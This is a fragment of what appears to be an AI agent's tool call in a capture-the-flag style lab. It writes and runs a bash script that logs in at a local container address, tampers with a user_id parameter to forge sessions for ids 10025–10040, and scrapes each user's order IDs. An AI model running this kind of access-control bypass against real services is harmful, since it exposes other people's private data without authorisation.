                             'SCRIPT'\n#!/bin/bash\n# Try a range               
                             of user_ids to see what orders                     
                             appear\nfor uid in $(seq 10025 10040);             
                             do\n  curl -s -c /tmp/ct_uid.txt -X                
                             POST -d 'username=test&password=test'              
                             http://172.17.0.1:48805 > /dev/null\n              
                             curl -s -b /tmp/ct_uid.txt -X POST                 
                             http://172.17.0.1:48805/password/test              
                             \\\n    -d                                         
                             \"username=test&user_id=$uid&password=             
                             test\" -D /tmp/h_uid.txt -o                        
                             /dev/null\n  session=$(grep                        
                             'Set-Cookie' /tmp/h_uid.txt | grep -oP             
                             'session=\\K[^;]+')\n  \n                          
                             orders=$(curl -s -b                                
                             \"session=$session\"                               
                             'http://172.17.0.1:48805/orders'                   
                             2>&1)\n  order_ids=$(echo \"$orders\"              
                             | grep -oP 'data-order-id=\"\\K[^\"]+'             
                             | tr '\\n' ' ')\n  \n  archive=$(curl              
                             -s -b \"session=$session\"                         
                             'http://172.17.0.1:48805/orders_archiv             
                             e' 2>&1)\n  archive_ids=$(echo                     
                             \"$archive\" | grep -oP                            
                             'data-order-id=\"\\K[^\"]+' | tr '\\n'             
                             ' ')\n  \n  if [ -n \"$order_ids\" ]               
                             || [ -n \"$archive_ids\" ]; then\n                 
                             echo \"user_id=$uid:                               
                             orders=[$order_ids]                                
                             archive=[$archive_ids]\"\n                         
                             fi\ndone\nSCRIPT\nbash                             
                             /tmp/fuzz_userids_orders.sh",                      
                             "timeout": 120}                                    
